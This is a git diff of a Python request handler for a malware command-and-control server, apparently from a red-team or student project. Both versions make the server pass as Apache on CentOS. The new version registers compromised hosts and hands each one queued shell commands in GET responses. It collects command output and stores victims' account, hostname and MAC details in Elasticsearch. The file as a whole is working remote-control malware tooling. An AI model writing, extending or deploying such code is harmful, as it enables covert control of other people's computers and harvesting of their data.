@@ -1,164 +1,160 @@
 import json
+import time
+import queue
+import threading
+import urllib.parse
+from pathlib import Path
 from urllib.parse import unquote_plus
 from http.server import BaseHTTPRequestHandler
-from server_settings import ES_HANDLER, CONNECTED_CLIENTS, RESPONSE_KEY, CWD_RESPONSE, RESPONSE, CLIENT_CREDENTIALS
+from server_settings import (
+    ES_HANDLER, CONNECTED_CLIENTS, client_lock,
+    command_queue, response_storage, response_lock,
+    CMD_REQUEST, RESPONSE, CWD_RESPONSE, CLIENT_CREDENTIALS,
+    RESPONSE_KEY, KEEP_ALIVE_CMD)
+
+
+# Map client IP -> last command ID sent
+last_cmd_id_per_ip = {}
+last_cmd_lock = threading.Lock()
 
 
 class MyHandler(BaseHTTPRequestHandler):
 
-    def __init__(self, *args, **kwargs):
-        # Initialize instance variables
-        self.current_client_ip = None  # Variable to hold the current client IP after using 'select' command
-        self.cmd_request = "/amos?center="
-        self.active_session = ""
-
-        # Call the parent class initializer with the given arguments
-        super().__init__(*args, **kwargs)
-
-    # Make our c2 server look like an up-to-date Apache server on CentOS
     server_version = "Apache/2.4.58"
     sys_version = "(CentOS)"
 
-
-    @staticmethod
-    def convert_text(text):
-            RESET = "\033[0m"
-            BOLD = "\033[1m"
-            COLOR = "\u001b[36m" 
-            return f"{BOLD}{COLOR}{text}{RESET}"
-
-
-    """Sends the HTTP response code and headers back to the client"""
-    def server_response(self, code: int):
-        self.send_response(code)
-        self.end_headers()
+    # creates a directory for each client using elasticsearch ID
+    def create_client_dir(self, client_id):
+        if not client_id:
+            return
+        dir_path = Path(__file__).parent / str(client_id)
+        dir_path.mkdir(parents=True, exist_ok=True)
 
 
+    # Handles get request from client
     def do_GET(self):
         try:
-            if self.path.startswith(self.cmd_request):
-                # Split out the client from the HTTP GET request
-                client = self.path.split(self.cmd_request)[1]
-                client_account = client.split('@')[0]
-                client_hostname = client.split('@')[1]
+            if not self.path.startswith(CMD_REQUEST):
+                self.send_response(404)
+                self.end_headers()
+                return
 
-                if client not in CONNECTED_CLIENTS.values() and not ES_HANDLER.is_client_present(client):
-                    client_id = ES_HANDLER.get_client_id("system-name", client_hostname)
-                    # Don't forget to handle none response
-                    CONNECTED_CLIENTS[client_id] = client_hostname
-                    self.server_response(200)
-                    print(f"{client_account}@{client_hostname} has been pwned!\n")
+            client_identifier = self.path.split(CMD_REQUEST)[1]
+            client_account, client_hostname = client_identifier.split('@')
+            client_id = ES_HANDLER.get_client_id("system-name", client_hostname)
 
-                elif ES_HANDLER.is_client_present(client):
-                    # Sends the HTTP response code and header back to the client
-                    self.server_response(200)
-                    print(f"{client_account}@{client_hostname} has reconnected!\n")
+            if not client_id:
+                client_id = client_identifier
+            with client_lock:
+                CONNECTED_CLIENTS[client_id] = {
+                    'display': client_identifier,
+                    'last_seen': time.time(),
+                    'ip': self.client_address[0]
+                }
 
+            command_to_send = None
+            cmd_id = None
+            temp_queue = []
+            try:
+                while True:
+                    item = command_queue.get_nowait()
+                    if item[0] == client_id:
+                        command_to_send = item[1]
+                        cmd_id = item[2]
+                        with last_cmd_lock:
+                            last_cmd_id_per_ip[self.client_address[0]] = cmd_id
+                        break
+                    else:
+                        temp_queue.append(item)
+            except queue.Empty:
+                pass
+            for item in temp_queue:
+                command_queue.put(item)
 
-                # If the client is in pwned_dict, and it is also our active session:
-                elif client in CONNECTED_CLIENTS:
-                    print("yes")
-                    """
-                    # Collect the command to run on the client; set Linux style prompt as well
-                    command = input(f"{client_account}@{client_hostname}: ")
-                    # Write the command back to the client as a response; must utf-8 encode
-                    self.server_response(200)
-                    self.wfile.write(command.encode())
-                    """
+            if command_to_send is None:
+                command_to_send = KEEP_ALIVE_CMD
 
-                else:
-                    self.server_response(400)
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(command_to_send.encode())
 
         except Exception as e:
-            print("[-]Unable to complete get request!!!")
-            print(e)
+            print(f"[-] Error in do_GET: {e}")
+            self.send_response(500)
+            self.end_headers()
 
 
-    # handle post requests
-    # noinspection PyPep8Naming
+    # Handles post requests from client
     def do_POST(self):
-        """ This method handles all HTTP POST requests that arrive at the c2 server. """
-        # Follow this code block when the compromised computer is responding with data to be printed on the screen
-        if self.path == RESPONSE:
-            print(self.handle_post_data())
+        try:
+            if self.path == RESPONSE or self.path == CWD_RESPONSE:
+                data = self._handle_post_data()
+                if not data.strip():
+                    self.send_response(200)
+                    self.end_headers()
+                    return
 
-        # Follow this code block when the compromised computer is responding with its current working directory
-        elif self.path == CWD_RESPONSE:
-            global cwd
-            cwd = self.handle_post_data()
+                # Try to parse as key=value pairs (new client format)
+                parsed = urllib.parse.parse_qs(data)
+                cmd_id = parsed.get('command_id', [None])[0]
+                cmd_output = parsed.get('output', [''])[0]
 
-        # Follow this code block to store client credentials
-        elif self.path == CLIENT_CREDENTIALS:
-            client_info = json.loads(self.handle_post_data())
-            mac_address = client_info["mac-address"]
+                if cmd_id is not None:
+                    # New format: we have explicit command ID
+                    if cmd_output.strip():
+                        with response_lock:
+                            response_storage[int(cmd_id)] = cmd_output
+                else:
+                    # Old format: data is the raw output, use last command ID for this IP
+                    with last_cmd_lock:
+                        last_id = last_cmd_id_per_ip.get(self.client_address[0])
+                    if last_id is not None and data.strip():
+                        with response_lock:
+                            response_storage[last_id] = data
+                    elif data.strip():
+                        print(f"[+] Output from {self.client_address[0]}:")
+                        print(data)
 
-            if ES_HANDLER.is_client_present(mac_address):
-                client_id = ES_HANDLER.get_client_id("mac-address", client_info["mac-address"])
-                ES_HANDLER.update_document(client_id, client_info)
-                print("[+]Client info has been updated!!!")
+                self.send_response(200)
+                self.end_headers()
+
+            elif self.path == CLIENT_CREDENTIALS:
+                data = self._handle_post_data()
+                client_info = json.loads(data)
+                username = client_info.get("user")
+                if username and ES_HANDLER.is_client_present(username):
+                    client_id = ES_HANDLER.get_client_id("mac-address", client_info.get("mac-address"))
+                    if client_id:
+                        ES_HANDLER.update_document(client_id, client_info)
+                        print(f"[+] Updated client info for {username}")
+                else:
+                    new_client_id = ES_HANDLER.index_client_data(client_info)
+                    if new_client_id:
+                        self.create_client_dir(new_client_id)
+                    print(f"[+] Indexed new client info for {username}")
+                self.send_response(200)
+                self.end_headers()
+
             else:
-                ES_HANDLER.index_client_data(client_info)
+                self.send_response(404)
+                self.end_headers()
+                print(f"[-] Unknown POST path: {self.path} from {self.client_address[0]}")
 
-        # Nobody should ever be posting to our c2 server other than to the above paths
-        else:
-            print(f"Intruder {self.client_address[0]} just accessed {self.path} on the server.\n")
-
-
-    def handle_post_data(self):
-        """Function to handle post data from a client."""
-        # Sends the HTTP response code and header back to the client
-        self.server_response(200)
-        # Get Content-Length value from HTTP Headers
-        content_length = int(self.headers.get("Content-Length"))
-        # Gather the client's data by reading in the HTTP POST data
-        client_data = self.rfile.read(content_length)
-        # UTF-8 decode the client's data
-        client_data = client_data.decode()
-        # Remove the HTTP POST variable and the equal sign from the client's data
-        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
-        # HTML/URL decode the client's data and translate '+' to a space
-        client_data = unquote_plus(client_data)
-        # Return the processed client's data
-        return client_data
-
-
-    def save_file(self, file_path: str, content):
-        try:
-            with open(file_path, 'wb') as file:
-                file.write(content)
-            print(f'File saved successfully at {file_path}')
         except Exception as e:
-            print(f'Error saving file: {e}')
+            print(f"[-] Error in do_POST: {e}")
+            self.send_response(500)
+            self.end_headers()
 
 
-    def client_info_handler(self, mac_address, client_info):
-        #check if client is present
-        if ES_HANDLER.is_client_present(mac_address):
-            ES_HANDLER.update_document(mac_address, client_info)
-        else:
-            ES_HANDLER.index_client_data(client_info)
-       
-
-    def get_client_id(self, client_ip: str):
-        # Get the client ID based on the client's IP address
-        if client_ip in CONNECTED_CLIENTS:
-            return CONNECTED_CLIENTS[client_ip]
-        else:
-            # If the client is not in the connected_clients dictionary, generate a new ID
-            new_client_id = len(CONNECTED_CLIENTS) + 1
-            CONNECTED_CLIENTS[client_ip] = new_client_id
-            return new_client_id
-
-
-    def get_client_ip(self, client_id: int, esHandler):
-        try:
-            resp = esHandler.es.get(index=esHandler.db_name, id=client_id)
-            return resp["_source"]["ip"]
-        except Exception as e:
-            print(f"An error occurred: {e}")
+    def _handle_post_data(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        if content_length == 0:
+            return ""
+        data = self.rfile.read(content_length).decode()
+        if data.startswith(f"{RESPONSE_KEY}="):
+            data = data.replace(f"{RESPONSE_KEY}=", "", 1)
+        return unquote_plus(data)
 
 
     def log_request(self, code="-", size="-"):
-        """Override BaseHTTPRequestHandler's log_request"""
-        return
-
+        pass
